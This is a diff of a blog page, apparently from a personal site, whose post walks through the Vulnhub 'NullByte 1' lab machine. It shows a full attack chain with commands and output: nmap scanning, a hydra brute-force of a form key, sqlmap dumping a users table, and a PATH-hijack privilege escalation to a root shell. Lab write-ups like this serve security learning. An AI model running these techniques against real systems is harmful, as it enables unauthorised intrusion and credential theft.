@@ -1,54 +1,55 @@
-	<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html>
 <head>
-  <link href="http://gmpg.org/xfn/11" rel="profile">
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.15" />
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Nullbyte 1 solution - Unlogic</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <link rel="canonical" href="http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/">
 
   
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-
-  <title> Nullbyte 1 solution &middot; Unlogic </title>
+  
 
   
-  <link rel="stylesheet" href="http://unlogic.co.uk/css/poole.css">
-  <link rel="stylesheet" href="http://unlogic.co.uk/css/syntax.css">
-  <link rel="stylesheet" href="http://unlogic.co.uk/css/hyde.css">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  
 
   
-  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://unlogic.co.uk/apple-touch-icon-144-precomposed.png">
-  <link rel="shortcut icon" href="http://unlogic.co.uk/favicon.png">
-
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Unlogic" />
+
+  <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk//css/combined-min.css">
+
 </head>
+<body class="">
 
-	<body class="">
-		<div class="sidebar">
-  <div class="container sidebar-sticky">
-    <div class="sidebar-about">
-      <a href="http://unlogic.co.uk/"><h1>Unlogic</h1></a>
-      <p class="lead">
-       I have a keyboard, a compiler, and a whole load of luck 
-      </p>
+<div class="site-wrap">
+  <header class="site-header px2 px-responsive">
+  <div class="mt2 wrap">
+    <div class="measure">
+      <a href="http://unlogic.co.uk/" class="site-title">Unlogic</a>
+      <nav class="site-nav right">
+      <a href="http://unlogic.co.uk/tags">Tags</a>
+
+</form>
+
+      </nav>
+      <div class="clearfix"></div>
     </div>
-
-    <ul class="sidebar-nav">
-      <li><a href="http://unlogic.co.uk/">Home</a> </li>
-      
-    </ul>
-
-    <p>Sven Steinbauer</p>
   </div>
-</div>
+</header>
 
+  <div class="post p2 p-responsive wrap" role="main">
+    <div class="measure">
+      <div class="post-header mb2">
+        <h1 class="py2">Nullbyte 1 solution</h1>
+        <span class="post-meta">Aug 25, 2015 by </span><br>
+        
+      </div>
 
-		<div class="content container">
-			<div class="post">
-			 	<h1>Nullbyte 1 solution</h1>
-			  <span class="post-date">Tue, Aug 25, 2015</span>
-			      
+      <article class="post-content">
+      
 
 <p>I&rsquo;ve been AFK for a while because of various reasons, but now I&rsquo;m back and have
 managed to scrape a little time together to get on with some of <a href="https://vulnhub.com">Vulnhub&rsquo;s</a>
@@ -60,18 +61,18 @@ new VMs.</p>
 
 <p>I ran the usual service discovery and found:</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# nmap -sV 192.168.56.101
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# nmap -sV 192.168.56.101
 
-Starting Nmap 6.49BETA4 <span style="color: #f92672">(</span> https://nmap.org <span style="color: #f92672">)</span> at 2015-08-25 11:29 BST
-Nmap scan report <span style="color: #66d9ef">for</span> 192.168.56.101
-Host is up <span style="color: #f92672">(</span>0.00057s latency<span style="color: #f92672">)</span>.
-Not shown: <span style="color: #ae81ff">997</span> closed ports
+Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-08-25 11:29 BST
+Nmap scan report <span class="k">for</span> 192.168.56.101
+Host is up <span class="o">(</span>0.00057s latency<span class="o">)</span>.
+Not shown: <span class="m">997</span> closed ports
 PORT    STATE SERVICE VERSION
-80/tcp  open  http    Apache httpd 2.4.10 <span style="color: #f92672">((</span>Debian<span style="color: #f92672">))</span>
-111/tcp open  rpcbind 2-4 <span style="color: #f92672">(</span>RPC <span style="color: #75715e">#100000)</span>
-777/tcp open  ssh     OpenSSH 6.7p1 Debian <span style="color: #ae81ff">5</span> <span style="color: #f92672">(</span>protocol 2.0<span style="color: #f92672">)</span>
-Service Info: OS: Linux<span style="color: #f8f8f2">;</span> CPE: cpe:/o:linux:linux_kernel
-</pre></div>
+80/tcp  open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+111/tcp open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+777/tcp open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
 
 
 <p>HTTP server on 80 and ssh on 777. I&rsquo;m going to take the straightforward one, and head
@@ -95,11 +96,11 @@ and the second was a no go, but at least told me there was a SQL server availabl
 is the image itself. There doesn&rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
 either. Well, let me take a look at the EXIF data then.</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/Downloads# exiftool main.gif 
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Downloads# exiftool main.gif 
 ExifTool Version Number         : 9.74
 File Name                       : main.gif
 Directory                       : .
-File Size                       : <span style="color: #ae81ff">16</span> kB
+File Size                       : <span class="m">16</span> kB
 File Modification Date/Time     : 2015:08:25 10:27:37+01:00
 File Access Date/Time           : 2015:08:25 10:28:35+01:00
 File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
@@ -113,9 +114,9 @@ Has Color Map                   : No
 Color Resolution Depth          : 8
 Bits Per Pixel                  : 1
 Background Color                : 0
-Comment                         : P-<span style="color: #f92672">)</span>: kzMb5nVYJw
+Comment                         : P-<span class="o">)</span>: kzMb5nVYJw
 Image Size                      : 235x302
-</pre></div>
+</code></pre></div>
 
 
 <p>Hrmm, that comment looks unusual. Let&rsquo;s try that in the URL. Initially I got a 404
@@ -127,29 +128,29 @@ takes me to a form asking for a key.</p>
 <p>Typing in something random just shows <code>invalid key</code>. Ok, let me take a look at the source,
 see where this thing goes.</p>
 
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&lt;center&gt;</span>
-<span style="color: #f92672">&lt;form</span> <span style="color: #a6e22e">method=</span><span style="color: #e6db74">&quot;post&quot;</span> <span style="color: #a6e22e">action=</span><span style="color: #e6db74">&quot;index.php&quot;</span><span style="color: #f92672">&gt;</span>
-Key:<span style="color: #f92672">&lt;br&gt;</span>
-<span style="color: #f92672">&lt;input</span> <span style="color: #a6e22e">type=</span><span style="color: #e6db74">&quot;password&quot;</span> <span style="color: #a6e22e">name=</span><span style="color: #e6db74">&quot;key&quot;</span><span style="color: #f92672">&gt;</span>
-<span style="color: #f92672">&lt;/form&gt;</span> 
-<span style="color: #f92672">&lt;/center&gt;</span>
-<span style="color: #75715e">&lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&gt;</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;center&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;index.php&quot;</span><span class="nt">&gt;</span>
+Key:<span class="nt">&lt;br&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">name=</span><span class="s">&quot;key&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span> 
+<span class="nt">&lt;/center&gt;</span>
+<span class="c">&lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&gt;</span>
+</code></pre></div>
 
 
 <p>Ok, so no SQLi here then, and the password isn&rsquo;t complex either. I&rsquo;m guessing
 a simple wordlist might solve this for me. Time to break out <code>hydra</code> for this:</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# hydra 192.168.56.101 http-form-post <span style="color: #e6db74">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l x -P /usr/share/dict/words -t <span style="color: #ae81ff">10</span> -w 30
-Hydra v8.1 <span style="color: #f92672">(</span>c<span style="color: #f92672">)</span> <span style="color: #ae81ff">2014</span> by van Hauser/THC - Please <span style="color: #66d9ef">do</span> not use in military or secret service organizations, or <span style="color: #66d9ef">for</span> illegal purposes.
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# hydra 192.168.56.101 http-form-post <span class="s2">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l x -P /usr/share/dict/words -t <span class="m">10</span> -w 30
+Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
 
-Hydra <span style="color: #f92672">(</span>http://www.thc.org/thc-hydra<span style="color: #f92672">)</span> starting at 2015-08-25 11:41:58
-<span style="color: #f92672">[</span>DATA<span style="color: #f92672">]</span> max <span style="color: #ae81ff">10</span> tasks per <span style="color: #ae81ff">1</span> server, overall <span style="color: #ae81ff">64</span> tasks, <span style="color: #ae81ff">99171</span> login tries <span style="color: #f92672">(</span>l:1/p:99171<span style="color: #f92672">)</span>, ~154 tries per task
-<span style="color: #f92672">[</span>DATA<span style="color: #f92672">]</span> attacking service http-post-form on port 80
-<span style="color: #f92672">[</span>STATUS<span style="color: #f92672">]</span> 18687.00 tries/min, <span style="color: #ae81ff">18687</span> tries in 00:01h, <span style="color: #ae81ff">80484</span> todo in 00:05h, <span style="color: #ae81ff">10</span> active
-<span style="color: #f92672">[</span>80<span style="color: #f92672">][</span>http-post-form<span style="color: #f92672">]</span> host: 192.168.56.101   login: x   password: elite
-<span style="color: #ae81ff">1</span> of <span style="color: #ae81ff">1</span> target successfully completed, <span style="color: #ae81ff">1</span> valid password found
-</pre></div>
+Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2015-08-25 11:41:58
+<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">10</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">99171</span> login tries <span class="o">(</span>l:1/p:99171<span class="o">)</span>, ~154 tries per task
+<span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
+<span class="o">[</span>STATUS<span class="o">]</span> 18687.00 tries/min, <span class="m">18687</span> tries in 00:01h, <span class="m">80484</span> todo in 00:05h, <span class="m">10</span> active
+<span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 192.168.56.101   login: x   password: elite
+<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</code></pre></div>
 </p>
 
 <p>Bingo. Once I enter that into the field I am able to search for usernames.</p>
@@ -161,48 +162,48 @@ is the part that is backed by a SQL database. Although usernames and the usual
 SQLi synbols don&rsquo;t do much, entering nothing dumps multiple records. Maybe I will
 try to <code>sqlmap</code> the URL to see if there&rsquo;s any vulnerabilities there</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>
 
 &lt;snip&gt;
 
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> GET parameter <span style="color: #e6db74">&#39;usrtosearch&#39;</span> seems to be <span style="color: #e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span> injectable 
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> testing <span style="color: #e6db74">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> testing <span style="color: #e6db74">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> automatically extending ranges <span style="color: #66d9ef">for</span> UNION query injection technique tests as there is at least one other <span style="color: #f92672">(</span>potential<span style="color: #f92672">)</span> technique found
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> ORDER BY technique seems to be usable. This should reduce the <span style="color: #f8f8f2">time </span>needed to find the right number of query columns. Automatically extending the range <span style="color: #66d9ef">for</span> current UNION query injection technique <span style="color: #f8f8f2">test</span>
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> target URL appears to have <span style="color: #ae81ff">3</span> columns in query
-<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> GET parameter <span style="color: #e6db74">&#39;usrtosearch&#39;</span> is <span style="color: #e6db74">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
-</pre></div>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> seems to be <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span> injectable 
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for</span> UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> ORDER BY technique seems to be usable. This should reduce the <span class="nb">time </span>needed to find the right number of query columns. Automatically extending the range <span class="k">for</span> current UNION query injection technique <span class="nb">test</span>
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL appears to have <span class="m">3</span> columns in query
+<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> is <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
+</code></pre></div>
 </p>
 
 <p>Result! Using this we can now dump the databasenames, tables, and data in the DB</p>
 
 <p>(output shortened for clarity)
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>ramses --current-db
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>ramses --current-db
 back-end DBMS: MySQL 5.0.12
-<span style="color: #f92672">[</span>11:13:44<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> fetching current database
-current database:    <span style="color: #e6db74">&#39;seth&#39;</span>
+<span class="o">[</span>11:13:44<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current database
+current database:    <span class="s1">&#39;seth&#39;</span>
 
-root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>ramses --tables -D seth
-<span style="color: #f92672">[</span>11:13:55<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> fetching tables <span style="color: #66d9ef">for</span> database: <span style="color: #e6db74">&#39;seth&#39;</span>
+root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>ramses --tables -D seth
+<span class="o">[</span>11:13:55<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">&#39;seth&#39;</span>
 Database: seth
-<span style="color: #f92672">[</span><span style="color: #ae81ff">1</span> table<span style="color: #f92672">]</span>
+<span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
 +-------+
-<span style="color: #f8f8f2">|</span> users <span style="color: #f8f8f2">|</span>
+<span class="p">|</span> users <span class="p">|</span>
 +-------+
 
 
-root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>ramses --dump -D seth -T users
+root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>ramses --dump -D seth -T users
 Database: seth
 Table: users
-<span style="color: #f92672">[</span><span style="color: #ae81ff">2</span> entries<span style="color: #f92672">]</span>
+<span class="o">[</span><span class="m">2</span> entries<span class="o">]</span>
 +----+---------------------------------------------+--------+------------+
-<span style="color: #f8f8f2">|</span> id <span style="color: #f8f8f2">|</span> pass                                        <span style="color: #f8f8f2">|</span> user   <span style="color: #f8f8f2">|</span> position   <span style="color: #f8f8f2">|</span>
+<span class="p">|</span> id <span class="p">|</span> pass                                        <span class="p">|</span> user   <span class="p">|</span> position   <span class="p">|</span>
 +----+---------------------------------------------+--------+------------+
-<span style="color: #f8f8f2">|</span> <span style="color: #ae81ff">1</span>  <span style="color: #f8f8f2">|</span> YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE <span style="color: #f8f8f2">|</span> ramses <span style="color: #f8f8f2">|</span> &lt;blank&gt;    <span style="color: #f8f8f2">|</span>
-<span style="color: #f8f8f2">|</span> <span style="color: #ae81ff">2</span>  <span style="color: #f8f8f2">|</span> --not allowed--                             <span style="color: #f8f8f2">|</span> isis   <span style="color: #f8f8f2">|</span> employee   <span style="color: #f8f8f2">|</span>
+<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE <span class="p">|</span> ramses <span class="p">|</span> &lt;blank&gt;    <span class="p">|</span>
+<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> --not allowed--                             <span class="p">|</span> isis   <span class="p">|</span> employee   <span class="p">|</span>
 +----+---------------------------------------------+--------+------------+
-</pre></div>
+</code></pre></div>
 </p>
 
 <p>An MD5 hashed password? I best put that through <a href="http://md5decoder.org/">md5decoder</a> to
@@ -215,22 +216,22 @@ port 777 on the VM. So I&rsquo;ll connect to that and have a look at what&rsquo;
 
 <p>Not much in his home directory, so I&rsquo;ll checkout what he&rsquo;s been up to</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ramses@NullByte:~<span style="color: #f8f8f2">$ </span>cat .bash_history 
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">ramses@NullByte:~<span class="nv">$ </span>cat .bash_history 
 sudo -s
 su eric
-<span style="color: #f8f8f2">exit</span>
+<span class="nb">exit</span>
 ls
 clear
-<span style="color: #f8f8f2">cd</span> /var/www
-<span style="color: #f8f8f2">cd </span>backup/
+<span class="nb">cd</span> /var/www
+<span class="nb">cd </span>backup/
 ls
 ./procwatch 
 clear
 sudo -s
-<span style="color: #f8f8f2">cd</span> /
+<span class="nb">cd</span> /
 ls
-<span style="color: #f8f8f2">exit</span>
-</pre></div>
+<span class="nb">exit</span>
+</code></pre></div>
 </p>
 
 <p>Interesting, ramses has something in <code>/var/www</code>. Seems like a setuid root
@@ -242,11 +243,11 @@ procwatch of course)</p>
 a symlink to <code>ls</code> in the current directory and name it <code>ps</code>. Then I set the <code>PATH</code> environment variable
 with the current dir at the front.</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>ln -s /bin/ls ps
-ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ export PATH</span><span style="color: #f92672">=</span><span style="color: #e6db74">`</span><span style="color: #f8f8f2">pwd</span><span style="color: #e6db74">`</span>:<span style="color: #e6db74">${</span><span style="color: #f8f8f2">PATH</span><span style="color: #e6db74">}</span>
-ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>./procwatch 
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">ramses@NullByte:/var/www/backup<span class="nv">$ </span>ln -s /bin/ls ps
+ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:<span class="si">${</span><span class="nv">PATH</span><span class="si">}</span>
+ramses@NullByte:/var/www/backup<span class="nv">$ </span>./procwatch 
 ls  procwatch  ps  readme.txt
-</pre></div>
+</code></pre></div>
 </p>
 
 <p>Excellent, it just calls <code>ps</code> without a path. A classic issue you can often
@@ -254,22 +255,86 @@ find in programs that call other programs.</p>
 
 <p>So let me leverage this to get myself a root shell and ultimately the flag</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>ln -snf /bin/sh ps
-ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>./procwatch 
-<span style="color: #75715e"># whoami </span>
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">ramses@NullByte:/var/www/backup<span class="nv">$ </span>ln -snf /bin/sh ps
+ramses@NullByte:/var/www/backup<span class="nv">$ </span>./procwatch 
+<span class="c"># whoami </span>
 root
-<span style="color: #75715e"># cat /root/proof.txt</span>
-<span style="color: #f92672">[</span>OUTPUT CUT<span style="color: #f92672">]</span>
-</pre></div>
+<span class="c"># cat /root/proof.txt</span>
+<span class="o">[</span>OUTPUT CUT<span class="o">]</span>
+</code></pre></div>
 </p>
 
 <p>And that concludes the NullByte VM walkthrough. A nice little machine with some fun
 challenges. Thanks to ly0n for creating it.</p>
 
-			</div>
+      </article>
 
-			
-		</div>
+      <p class="post-meta">Tags:&nbsp;
+        
+            
+            <a href="http://unlogic.co.uk//tags/walkthrough">walkthrough</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/nullbyte">nullbyte</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/vulnhub">vulnhub</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/security">security</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/solution">solution</a>
+        
+            ,&nbsp;
+            <a href="http://unlogic.co.uk//tags/NB0x01">NB0x01</a>
+        
+      </p>
 
-  </body>
+      
+<div id="disqus_thread">
+  <script type="text/javascript">
+     var disqus_shortname = "unlogic";
+     var disqus_identifier = "\/2015\/08\/25\/nullbyte-1-solution\/";
+
+     (function() {
+       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+       dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+     })();
+  </script>
+</div>
+
+
+    </div>
+  </div>
+</div>
+    <footer class="footer">
+      <div class="p2 wrap">
+        <div class="measure mt1 center">
+      <nav class="social-icons icons">
+<a class="fa fa-rss rss" href="http://unlogic.co.uk/index.xml"></a>
+
+<a class="fa fa-twitter twitter" href="https://twitter.com/binaryheadache"></a>
+
+</nav>
+
+          <small>
+            Copyright &#169; 2015<br>
+            Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
+          </small>
+        </div>
+      </div>
+    </footer>
+
+    
+    <script src="http://unlogic.co.uk/js/highlight.pack.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    
+
+
+</body>
 </html>
+
